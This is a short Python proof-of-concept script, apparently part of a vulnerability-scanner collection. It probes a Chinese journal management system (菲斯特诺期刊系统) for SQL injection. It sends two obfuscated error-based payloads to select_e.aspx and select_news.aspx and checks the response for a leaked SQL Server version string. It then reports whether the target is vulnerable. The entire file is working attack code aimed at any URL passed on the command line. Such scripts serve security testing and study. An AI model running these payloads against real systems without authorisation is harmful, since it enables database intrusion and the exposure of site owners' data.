#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 菲斯特诺期刊系统多处SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2015-0125186
         http://www.wooyun.org/bugs/wooyun-2010-0116361
author: Lucifer
description: 菲斯特诺期刊系统多处SQL注入。
'''
import sys
import requests
import warnings
def run(url):
        result = ['菲斯特诺期刊系统多处SQL注入','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payloads = ["/select_e.aspx?type=zzdw&content=1%27AnD%20ChAr(ChAr(74)%2BChAr(73)%2B@@VeRsIoN)<0--",
                    "/select_news.aspx?type=1&content=1/**//'/**/AnD/**/ChAr(ChAr(74)%2BChAr(73)%2B@@VeRsIon)/**/>0",]
        try:
            noexist = True
            for payload in payloads:
                vulnurl = url + payload
                req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                if r"JIMicrosoft" in req.text:
                    result[2]=  '存在'
                    result[1] = vulnurl
                    noexist = False
            if noexist:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
